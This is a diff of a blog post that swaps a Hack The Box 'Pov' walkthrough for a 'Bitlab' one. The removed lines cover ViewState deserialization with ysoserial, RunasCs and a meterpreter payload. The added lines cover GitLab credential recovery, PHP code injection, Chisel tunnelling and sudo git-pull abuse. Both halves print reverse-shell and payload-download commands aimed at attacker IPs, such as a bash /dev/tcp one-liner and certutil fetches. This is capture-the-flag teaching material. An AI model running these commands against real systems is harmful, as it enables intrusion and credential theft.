@@ -6,6 +6,43 @@ tags:
   - windows
   - medium
 ---
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/Bitlab.png)
+
+**Bitlab** was a pretty hard box which included reversing .exe file and abusing sudoers file. 
+
+I first gained access to Gitlab login credential through deobfuscating javascript. From there, I injected php RCE script to profile page's index.php file which spawned me shell as www-data. From here, I reverse engineered RemoteConnection.exe file to obtain credentials for the root. There was another way of privilege escalation to root, which was to create copy of the .git directories and make a git pull which includes a payload that will spawn a reverse shell as the root. 
+
+## Information Gathering
+### Rustscan
+
+Rustscan discovers SSH and HTTP open:
+
+```bash
+┌──(yoon㉿kali)-[~/Documents/htb/bitlab]
+└─$ rustscan --addresses 10.10.10.114 --range 1-65535
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: https://discord.gg/GFrQsGy           :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+Nmap? More like slowmap.🐢
+<snip>
+Host is up, received syn-ack (0.41s latency).
+Scanned at 2024-04-23 01:17:08 EDT for 0s
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 0.93 seconds
+```
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/Pov.png)
 
 ## Information Gathering
@@ -34,224 +71,365 @@ At the bottom of the page, we see the potential username **sfitz**:
 
 Website is a pretty simple with close to zero functionality. Let's see if there are other subdomains available:
 
-`gobuster vhost --append-domain -u http://pov.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-7.png)
+### Nmap
 
-**dev.pov.htb** is found. We will add it to `/etc/hosts`.
+Nmap finds nothing interesting:
 
-#### dev.pov.htb
+```bash
+┌──(yoon㉿kali)-[~/Documents/htb/bitlab]
+└─$ sudo nmap -sVC -p 22,80 10.10.10.114   
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-23 02:01 EDT
+Nmap scan report for 10.10.10.114
+Host is up (0.41s latency).
 
-The website is all about the Web Develop and UI/UX Designer, Stephen Fitz:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 (RSA)
+|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc (ECDSA)
+|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 (ED25519)
+80/tcp open  http    nginx
+|_http-trane-info: Problem with XML parsing of /evox/about
+| http-title: Sign in \xC2\xB7 GitLab
+|_Requested resource was http://10.10.10.114/users/sign_in
+| http-robots.txt: 55 disallowed entries (15 shown)
+| / /autocomplete/users /search /api /admin /profile 
+| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
+|_/s/ /snippets/new /snippets/*/edit
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-4.png)
-
-This person must be the same person as `sfitz@pov.htb`.
-
-Let's look around the website. 
-
-`/portfolio/contact.aspx` is a form where you can send messages but the form seems to be dead:
-
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-6.png)
-
-There's a function where we can download CV about Stephen Fitz:
-
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-5.png)
-
-There is nothing interesting about the download CV itself:
-
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-8.png)
-
-Let's intercept the traffic for downloading CV and take a look into it. 
-
-## LFI
-
-There are lot of parameters available such as **__VIEWSTATE** and **__VIEWSTATEGENERATOR**:
-
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-9.png)
-
-We will first test if the parameter **file=** is vulnerable to Local File Inclusion(**LFI**) by trying to read `C:\Windows\win.ini`:
-
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-11.png)
-
-This webapp is indeed vulnerable to LFI and it successfully downloads **win.ini** to our local machine:
-
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-12.png)
-
-We have verified there being LFI vulnerability. What file should we be reading? 
-
-Doing some researching on this, we found out **__VIEWSTATE** could be exploited. 
-
-## Shell as sfitz
-### VIEWSTATE
-
-You can learn more about exploiting **__VIEWSTATE** from [Hacktricks](https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter#test-case-4-.net-greater-than-4.5-and-enableviewstatemac-true-false-and-viewstateencryptionmode-true) and [here](https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817).
-
-We would have to first find out .NET framework version. This can be found out inside `C:\web.config` file and we should be able to read this through LFI vulnerability identified.
-
-Let's try reading `/web.config`. 
-
-We are able to read it with no problem:
-
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-10.png)
-
-.NET framework seems to be version 4.5 and it also reveals **decryptionKey** and **validationKey**.
-
-The next step is to generate a serialized payload using [YSoSerial.Net](https://github.com/pwntester/ysoserial.net).
-
-After downloading the file, we will run the following command:
-
-```powershell
-./ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell -e JABj<snip>==" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" 
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.29 seconds
 ```
 
-We know, it is very long. Let's break it down. 
+## Enumeration
+### HTTP - TCP 80
 
-`-p` parameter sets where we should copy-paste the output of the command.
+10.10.10.114 redirects me to `http://10.10.10.114/users/sign_in`, which seems to be a GitLab Sign-in page:
 
-`-c` parameter includes the actual powershell command we will be running. We are using base64 encoded powershell reverse shell payload [revshells](www.revshells.com).
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image.png)
 
-`--validationkey` parameter includes validation key we found from **web.config**.
+Feroxbuster finds bunch of new valid paths.
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/pov-ps.png)
+I can map them with Burp Suite as such:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-8.png)
 
 
-We will copy paste the output of the command to parameter **__VIEWSTATE**:
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-13.png)
+Feroxbuster finds two valid users as well: `/root` & `/clave`
 
-As we forward the traffic, we get reverse shell connection as **sfitz**:
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-14.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-1.png)
 
-## Privesc: sfitz to alaading
-### PSCredentials
 
-Looking around the file system, we discovered **connection.xml** file inside Documents folder:
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-2.png)
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-15.png)
+## Login Bypass
 
-It includes encrypted **PSCredentials** for user **alaading**:
+Going to `/help/bookmarks.html`, there are several Bookmarks:
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-16.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-3.png)
 
-Using the command below, we can easily decrypt it:
+**Gitlab Login** leads me to weird url encoding:
 
-```powershell
-$cred = Import-CliXml C:\Users\sfitz\Documents\connection.xml
-$cred.GetNetworkCredential() | fl
+```js
+javascript:(function(){
+        var _0x4b18=["\x76\x61\x6C\x75\x65",
+                    "\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E",
+                    "\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64",
+                    "\x63\x6C\x61\x76\x65",
+                    "\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64",
+                    "\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"
+                    ];
+        document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()
 ```
 
-PSCredentials is successfully decrypted: **f8gQ8fynP44ek1m3**
+I will bookmark **Gitlab Login** as such:
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-17.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-4.png)
 
-### RunasCs
+Returning to sign-in page, credentials auto-fills:
 
-Now that we have the credentials for user **alaading**, we should be able to run commands as him using **RunasCs.exe**.
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-5.png)
 
-Let's first upload **RunasCs.exe**:
+By intercepting the request with Burp Suite, I can see the password in plain text: **11des0081x**
 
-`certutil.exe -urlcache -split -f http://10.10.14.36:1234/RunasCs.exe`
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-6.png)
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-18.png)
+With the found credentials, I can successfully sign-in:
 
-Let's spawn reverse shell as alaading on our netcat listener:
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-7.png)
 
-`./RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -r 10.10.14.36:1338`
+I see two projects listed: **Profile** and **Deployer**. I would have to look in to this later. 
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-19.png)
+## Shell as www-data
 
-We have successfully spawned reverse shell as user alaading:
+Going to `/dashboard/snippets`, shows **postgresql** snippet:
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-20.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-9.png)
+
+It reveals the credentials for PostgreSQL -> **profiles:profiles**
+
+`/snippets/1`
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-10.png)
+
+### Index.php Reverse Shell
+
+Now let's move back and check on Project Profiles:
+
+`/root/profile`
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-11.png)
 
 
-## Privesc: alaading to administrator
-### SeDebugPrivilege
+It seems like **index.php** is for the user description as such:
 
-Checking on privilege alaadig has, we see **SeDebugPrivilege**, which is unusal:
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-12.png)
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-21.png)
+I will try adding php script to see if it work:
 
-From [HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens), you can learn more about it. 
+`<?php echo system(‘whoami’); ?>`
 
-Since **SeDebugPrivilege** is disabled, let's enable it using [psgetsys.ps1](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1).
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-13.png)
 
-We will first upload it to the system using certutil:
+Without any restriction, I can merge the change to master branch:
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-24.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-14.png)
 
-When we run it, we can see SeDebugPrivilege enabling:
+After merging, `/profile` shows the executed command:
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-26.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-15.png)
 
-#### mimikatz
+I would be able to get a reverse shell connection using the php script below:
 
-Let's first try dumping credentials using mimikatz. 
-
-We will upload mimikatz.exe using certutil:
-
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-22.png)
-
-We tried dumping logonpasswords, but it wasn't successful for some reason:
-
-```cmd
-mimikatz.exe
-mimikatz # log
-mimikatz # sekurlsa::minidump lsass.dmp
-mimikatz # sekurlsa::logonpasswords
+```php
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.21/1337 0>&1'");
+?>
 ```
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-23.png)
+After merging the change, I get a shell connection as www-data
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-19.png)
 
 
-#### Reverse Shell
+## Priesc: www-data to clave
 
-Since mimikatz didn't work out, let's try to spawn a reverse shell as the administrator.
 
-We are going to mock the process running as the system and spawn a reverse shell using it's privilege. 
+After making the shell more interactive using `python2 -c 'import pty; pty.spawn("/bin/bash")'`, I ran lse.sh to see if it finds anything.
 
-**Winlogon** usually has the system privilege. Let's check out it's process ID:
+I can run `git pull` with the root privilege, this is something interesting:
 
-`Get-Process winlogon`
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-21.png)
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-25.png)
+Uncommon SUID mount.cifs is found but this doesn't seem very intriguing to me:
 
-With the process ID noted, let's create a reverse shell payload using msfvenom:
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-20.png)
 
-`sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.36 LPORT=3456 -f exe -o payload.exe`
+### git pull privesc
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-27.png)
+[This source](https://github.com/arnav-t/git-pull-priv-escalation/blob/master/README.md) shows a way on how to abuse git pull sudoer privilege:
 
-We will transfer the payload to the target system:
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-22.png)
 
-`certutil.exe -urlcache -split -f http://10.10.14.36:1234/payload.exe`
+In order to exploit this, I need write privilege on `.git/hooks` but www-data doesn't have this privilege:
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-28.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-23.png)
 
-Now we are almost done. We have...
+If www-data has a privilege to create file inside `.git/hooks`, I can create such payload inside of it and run `git pull` to run commands as the root:
 
-- Enabled SeDebugPrivilege using psgetsys.ps1
-- Noted process running as system
-- Transferred payload
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-24.png)
 
-We will set up a listener using **msfconsole** meterpreter:
+Since www-data doesn't have enough privilege to exploit this, I will move from here for now.
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-29.png)
+- *I thought this was not exploitable, but later from other's write-ups I realized it is actually exploitable -> More at the below*
+### Ping Sweep & Port Scan
 
-Let's run the payload:
+From some enumeration, I realized that this server is running with docker. 
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-30.png)
+Let's see if there are any other network connected to this server:
 
-After we get a connection on meterpreter, let's migrate to **winlogon** and spawn a shell with it:
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-25.png)
 
-![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/pov/image-31.png)
+It seems that **172.19.0.1** is also connected.
 
-We now have the shell as the system.
+I will use ping sweep to see what host are actually open:
+
+`time for i in $(seq 1 254); do (ping -c 1 172.19.0.${i} | grep "bytes from" &); done`
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-26.png)
+
+Ping sweep finds 5 hosts alive.
+
+Since nmap is installed on the host, I will use it for port scanning:
+
+`nmap 172.19.0.2-5`
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-30.png)
+
+.2 and .3 could be running Gitlab and postgres host is .5.
+
+### Tunneling
+
+Running `netstat -ntlp`, I see local box is also listening on port 5432, which probally means this forwards to postgres container at .5:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-31.png)
+
+**psql** command is not installed on the local box so I would have to port forward it to my local Kali machine:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-32.png)
+
+#### Chisel
+
+After transferring Chisel to the target box, I will start the client session towards Kali's Chisel server so I can access port 5432 on my local kali machine:
+
+`./chisel_linux client 10.10.14.21:9000 R:5432:localhost:5432`
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-33.png)
+
+On my Kali Chisel server, I have a connection made:
+
+`chisel server -p 9000 --reverse`
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-34.png)
+
+Now with the credentials found from Postgresql snippet earlier, I can access port 5432 through from Kali machine:
+
+`psql -h 127.0.0.1 -p 5432 -U profiles`
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-35.png)
+
+### PSQL
+
+Through `\l`, I will list all the DBs available. **gitlab** and **profiles** looks interesting to me:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-36.png)
+
+I can connect to DB **gitlab** through `\c gitlab`:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-37.png)
+
+Listing tables with `\dt`, I see  a bunch:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-38.png)
+
+Among all of them, **users** table looks interesting to me:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-39.png)
+
+I can list columns inside of it through `\d users` and it has columns of encrypted password an username:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-40.png)
+
+However it seems like I don't have permission to read these:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-41.png)
+
+I will move the DB connection to **profiles**:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-42.png)
+
+There seems to be only one table in there:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-43.png)
+
+It shows password for user clave: **c3NoLXN0cjBuZy1wQHNz==**
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-44.png)
+
+Using the found credential, I can sign-in to SSH as clave:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-46.png)
+
+## Privesc: clave to root
+
+There are two ways for privescalation to root.
+
+- lower-user (clave,www-data) to root: Abusing sudoers
+- Clave to root: Reversing RemoteConnection.exe
+
+
+
+### RemoteConnection.exe
+
+On Clave's home directory, I see **RemoteConnection.exe** file which is quite odd since this machine is a Linux machine:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-47.png)
+
+I will copy the .exe over to my local Kali machine through **scp**:
+
+`scp clave@10.10.10.114:~/RemoteConnection.exe .`
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-48.png)
+
+#### ollydbg
+
+I will first install **ollydbg** through `apt install ollydbg`.
+
+After opening **RemoteConnection.exe** file, I will right click it and Search for all referenced text strings:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/butlab2.png)
+
+
+Here you’ll see a bunch of strings, one of which contains the username clave and the Access Denied msg.
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-56.png)
+
+Click on the Access Denied string and press F2 to set a breakpoint. This is where the program will halt if you F9 and allow it to run continuously.
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-57.png)
+
+
+
+Restart the program in the debugger. Now press F9 once to run the program. It will halt exactly where you placed the breakpoint. Once there, in the stack pane at the bottom right we see this:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-58.png)
+
+This appears to be the root password. After some testing I found that the password actually is for root:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-59.png)
+
+### Git Pull
+
+Second way of privesc to root is through abusing sudoers file.
+
+Remember earlier that I mentioned abusing sudoers won't be possible since I don't have permission to create files inside `.git/hooks`? Well, I was wrong. There's a way to bypass this:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-21.png)
+
+In `git`, a `pull` is actually a `git fetch` followed by a `git merge`. I can make my own hook, a `post-merge` hook, and put a shell in there.
+
+I could create a new project, but to do a `git pull`, I’ll need to connect it to a remote project. I could stand up my own git server on my kali box.
+
+A much easier way to do this is to just copy one of the projects. I’ll copy it into a working directory in `/tmp`:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-49.png)
+
+I’ll write a reverse shell as a `post-merge` hook, and set it executable:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-51.png)
+
+Running git pull won't work currently since there's nothing to merge:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-53.png)
+
+I made slight change in **index.php** so that there's something to merge:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-54.png)
+
+Now I can pull it:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-55.png)
+
+Reverse shell as root is spawned on my local listener:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/bitlab/image-60.png)
+
 
 ## References
-- https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter#test-case-4-.net-greater-than-4.-5-and-enableviewstatemac-true-false-and-viewstateencryptionmode-true
-- https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817
-- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
-- https://notes.morph3.blog/windows/privilege-escalation/sedebugprivilege
+- https://github.com/arnav-t/git-pull-priv-escalation/blob/master/README.md
+- https://sckull.github.io/posts/bitlab
+- https://ivanitlearning.wordpress.com/2020/10/22/hackthebox-bitlab/
